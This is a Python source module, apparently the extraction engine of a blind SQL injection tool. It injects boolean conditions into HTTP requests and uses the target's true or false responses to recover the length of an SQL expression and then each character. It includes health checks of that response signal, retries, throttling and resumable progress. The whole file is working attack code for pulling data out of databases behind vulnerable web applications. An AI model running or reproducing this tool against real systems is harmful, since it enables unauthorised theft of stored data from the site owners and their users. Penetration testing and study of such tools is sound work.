"""Concrete extraction orchestration."""

import logging
import math
import time
from collections.abc import Callable

from detection import Detector
from models.attack import CharacterResult, ExtractionResult
from models.http import HttpResponseData, RequestData
from payloads import ConditionBuilder, InjectionPoint, PayloadBuilder
from transport import HttpClient
from .contracts import Extractor, SearchStrategy


logger = logging.getLogger(__name__)


class BlindExtractor(Extractor):
    """Extract one expression by composing the injected framework services."""

    def __init__(
        self,
        *,
        http_client: HttpClient,
        condition_builder: ConditionBuilder,
        payload_builder: PayloadBuilder,
        injection_point: InjectionPoint,
        detector: Detector,
        search_strategy: SearchStrategy,
        base_request: RequestData,
        charset: str,
        max_length: int = 100,
        delay: float = 0.0,
        request_budget: int | None = None,
        sleeper: Callable[[float], None] = time.sleep,
        clock: Callable[[], float] = time.monotonic,
        on_progress: Callable[[str, tuple[CharacterResult, ...], bool], None] | None = None,
        pre_extract_length: bool = True,
        oracle_recheck_interval: int = 0,
        oracle_recheck_retries: int = 3,
        oracle_recheck_backoff: float = 1.0,
        position_retries: int = 2,
    ) -> None:
        if not charset:
            raise ValueError("charset cannot be empty")
        if len(set(charset)) != len(charset):
            raise ValueError("charset cannot contain duplicate characters")
        if max_length < 1:
            raise ValueError("max_length must be positive")
        if delay < 0:
            raise ValueError("delay cannot be negative")
        if request_budget is not None and request_budget < 1:
            raise ValueError("request_budget must be positive")
        self._http_client = http_client
        self._condition_builder = condition_builder
        self._payload_builder = payload_builder
        self._injection_point = injection_point
        self._detector = detector
        self._search_strategy = search_strategy
        self._base_request = base_request
        self._charset = charset
        self._max_length = max_length
        self._delay = delay
        self._request_budget = request_budget
        self._request_count = 0
        self._sleeper = sleeper
        self._clock = clock
        self._on_progress = on_progress
        self._last_request: RequestData | None = None
        self._last_response: HttpResponseData | None = None
        self._last_payload: str | None = None
        self._pre_extract_length = pre_extract_length
        self._oracle_recheck_interval = oracle_recheck_interval
        self._oracle_recheck_retries = oracle_recheck_retries
        self._oracle_recheck_backoff = oracle_recheck_backoff
        self._position_retries = position_retries

    def _check_request_budget(self) -> None:
        if self._request_budget is None:
            return
        if self._request_count >= self._request_budget:
            raise RuntimeError(
                f"request budget exceeded: {self._request_count}/{self._request_budget}"
            )

    def _binary_search_length(self, expression: str) -> int | None:
        """Find LENGTH(expression) using binary search over [0, max_length].

        Costs ~log2(max_length) + 2 requests.  After the search converges the
        result is verified with two confirmation queries (LENGTH >= found and
        LENGTH < found+1) so that a single flaky server response during the
        search cannot silently truncate the extraction.  On a mismatch the
        method returns None, falling the caller back to sequential mode.
        """
        low, high = 0, self._max_length

        while low < high:
            mid = (low + high + 1) // 2
            self._check_request_budget()
            condition = self._condition_builder.build_length(expression, mid, ">=")
            result = self.test_condition(condition)
            if self._delay:
                self._sleeper(self._delay)
            logger.debug("Length binary search: mid=%d result=%s", mid, result)
            if result:
                low = mid
            else:
                high = mid - 1

        if low == 0:
            self._check_request_budget()
            verify = self._condition_builder.build_length(expression, 1, ">=")
            if not self.test_condition(verify):
                if self._delay:
                    self._sleeper(self._delay)
                logger.info(
                    "LENGTH >= 1 was False; could be empty or a flaky "
                    "oracle — falling back to sequential extraction",
                )
            else:
                if self._delay:
                    self._sleeper(self._delay)
            return None

        self._check_request_budget()
        confirm_ge = self._condition_builder.build_length(expression, low, ">=")
        if not self.test_condition(confirm_ge):
            if self._delay:
                self._sleeper(self._delay)
            logger.warning(
                "Length verification failed: LENGTH >= %d was False; "
                "falling back to sequential extraction", low,
            )
            return None

        if self._delay:
            self._sleeper(self._delay)

        self._check_request_budget()
        confirm_next = self._condition_builder.build_length(expression, low + 1, ">=")
        if self.test_condition(confirm_next):
            if self._delay:
                self._sleeper(self._delay)
            logger.warning(
                "Length verification failed: LENGTH >= %d was True (binary "
                "search returned %d); falling back to sequential extraction",
                low + 1, low,
            )
            return None

        if self._delay:
            self._sleeper(self._delay)

        return low

    def _oracle_health_check(self) -> bool:
        """Verify the oracle still works with a known true/false pair."""
        try:
            true_result = self.test_condition("1=1")
            if self._delay:
                self._sleeper(self._delay)
            false_result = self.test_condition("1=2")
            if self._delay:
                self._sleeper(self._delay)
            return true_result and not false_result
        except Exception:
            return False

    def _oracle_health_check_with_retry(self) -> bool:
        """Run health check with backoff retries. Returns True if oracle recovered."""
        for attempt in range(self._oracle_recheck_retries):
            if self._oracle_health_check():
                if attempt > 0:
                    logger.info("Oracle recovered after %d retry(ies)", attempt)
                return True
            backoff = self._oracle_recheck_backoff * (2 ** attempt)
            logger.info(
                "Oracle health check failed (attempt %d/%d), backing off %.1fs",
                attempt + 1,
                self._oracle_recheck_retries,
                backoff,
            )
            self._sleeper(backoff)
        logger.warning("Oracle health check failed after %d attempts", self._oracle_recheck_retries)
        return False

    def _find_character_with_retry(
        self,
        expression: str,
        position: int,
    ) -> CharacterResult:
        """Try to find a character, retrying on failure with health checks."""

        def predicate(value: int, position: int = position) -> bool:
            self._check_request_budget()
            condition = self._condition_builder.build(
                expression,
                position,
                self._search_strategy.comparison_operator,
                value,
            )
            result = self.test_condition(condition)
            if self._delay:
                self._sleeper(self._delay)
            logger.debug(
                "Position %d evaluated candidate ASCII %d: %s",
                position,
                value,
                result,
            )
            return result

        def confirmation(value: int, position: int = position) -> bool:
            self._check_request_budget()
            condition = self._condition_builder.build(expression, position, "=", value)
            result = self.test_condition(condition)
            if self._delay:
                self._sleeper(self._delay)
            return result

        result = self._search_strategy.find(
            position, self._charset, predicate, confirmation
        )

        if result.character is not None or self._position_retries < 1:
            return result

        for retry in range(self._position_retries):
            if retry > 0:
                if not self._oracle_health_check():
                    if not self._oracle_health_check_with_retry():
                        logger.error(
                            "Oracle unrecoverable at position %d, aborting retries",
                            position,
                        )
                        return result

            logger.debug(
                "Retrying position %d (attempt %d/%d)",
                position,
                retry + 1,
                self._position_retries,
            )
            result = self._search_strategy.find(
                position, self._charset, predicate, confirmation
            )
            if result.character is not None:
                return result

        return result

    def extract(
        self,
        expression: str,
        *,
        resume_from: tuple[CharacterResult, ...] = (),
    ) -> ExtractionResult:
        """Extract up to ``max_length`` characters from an SQL expression.

        ``resume_from`` seeds already-resolved positions (e.g. from a
        checkpoint) so the loop below starts past them instead of
        re-querying the oracle for characters that are already known.
        Callers are responsible for only passing ``resume_from`` captured
        under an identical configuration; nothing here re-validates it.
        """
        if not expression.strip():
            raise ValueError("expression cannot be empty")

        characters = list(resume_from)
        complete = False
        start_time = self._clock()

        effective_max = self._max_length
        if self._pre_extract_length and not resume_from:
            try:
                known_length = self._binary_search_length(expression)
                if known_length is not None:
                    effective_max = known_length
                    length_requests = int(math.ceil(math.log2(max(self._max_length, 2)))) + 1
                    logger.info(
                        "Pre-extracted length=%d for expression (cost ~%d requests)",
                        known_length,
                        length_requests,
                    )
                    if known_length == 0:
                        if self._on_progress is not None:
                            self._on_progress(expression, (), True)
                        return ExtractionResult(expression, "", (), True)
            except RuntimeError:
                raise
            except Exception:
                logger.warning("Length pre-extraction failed; falling back to sequential")

        positions_since_check = 0

        for position in range(len(resume_from) + 1, effective_max + 1):
            logger.debug("Evaluating extraction position %d", position)
            self._check_request_budget()

            if effective_max == self._max_length:
                end_condition = self._condition_builder.build_length(expression, position)
                end_result = self.test_condition(end_condition)
                if self._delay:
                    self._sleeper(self._delay)
                if end_result:
                    complete = True
                    break

            if (
                self._oracle_recheck_interval > 0
                and positions_since_check >= self._oracle_recheck_interval
            ):
                positions_since_check = 0
                if not self._oracle_health_check():
                    logger.warning("Periodic oracle health check failed")
                    if not self._oracle_health_check_with_retry():
                        logger.error(
                            "Oracle unrecoverable after health check at position %d",
                            position,
                        )
                        break

            result = self._find_character_with_retry(expression, position)
            characters.append(result)
            positions_since_check += 1

            elapsed = self._clock() - start_time
            positions_done = len(characters) - len(resume_from)
            average_per_position = elapsed / positions_done if positions_done else 0.0
            eta = average_per_position * max(effective_max - position, 0)
            logger.info(
                "Position %d/%d resolved as %s after %d request(s) "
                "(%.1fs elapsed, ~%.1fs remaining)",
                position,
                effective_max,
                result.character if result.character is not None else "<not found>",
                result.attempts,
                elapsed,
                eta,
            )
            if self._on_progress is not None:
                self._on_progress(expression, tuple(characters), False)
            if result.character is None:
                complete = False
                break

        if not complete and len(characters) == effective_max:
            end_condition = self._condition_builder.build_length(
                expression, effective_max + 1
            )
            if self.test_condition(end_condition):
                complete = True
            elif effective_max != self._max_length:
                logger.warning(
                    "Pre-extracted length %d may be wrong (LENGTH >= %d is "
                    "True); continuing extraction up to max_length %d",
                    effective_max, effective_max + 1, self._max_length,
                )
                for position in range(effective_max + 1, self._max_length + 1):
                    self._check_request_budget()
                    end_cond = self._condition_builder.build_length(
                        expression, position
                    )
                    if self.test_condition(end_cond):
                        if self._delay:
                            self._sleeper(self._delay)
                        complete = True
                        break
                    if self._delay:
                        self._sleeper(self._delay)
                    extra = self._find_character_with_retry(expression, position)
                    characters.append(extra)
                    if self._on_progress is not None:
                        self._on_progress(expression, tuple(characters), False)
                    if extra.character is None:
                        break
            if self._delay:
                self._sleeper(self._delay)

        if self._on_progress is not None:
            self._on_progress(expression, tuple(characters), complete)

        value = "".join(result.character or "" for result in characters)
        return ExtractionResult(expression, value, tuple(characters), complete)

    def test_condition(self, condition: str) -> bool:
        """Send one built condition and classify its normalized response."""
        if not condition.strip():
            raise ValueError("condition cannot be empty")

        self._check_request_budget()
        payload = self._payload_builder.build(condition)
        request = self._injection_point.inject(self._base_request, payload)
        response = self._http_client.send(request)

        self._last_request = request
        self._last_response = response
        self._last_payload = payload
        self._request_count += 1

        return self._detector.is_true(response)

    @property
    def last_request(self) -> RequestData | None:
        return self._last_request

    @property
    def last_response(self) -> HttpResponseData | None:
        return self._last_response

    @property
    def last_payload(self) -> str | None:
        return self._last_payload

    @property
    def charset(self) -> str:
        """Return the configured candidate character set."""
        return self._charset

    @property
    def max_length(self) -> int:
        """Return the maximum number of characters to extract."""
        return self._max_length

    @property
    def injection_point(self) -> InjectionPoint:
        """Return the configured request injection point."""
        return self._injection_point

    @property
    def base_request(self) -> RequestData:
        """Return the unmodified base request."""
        return self._base_request
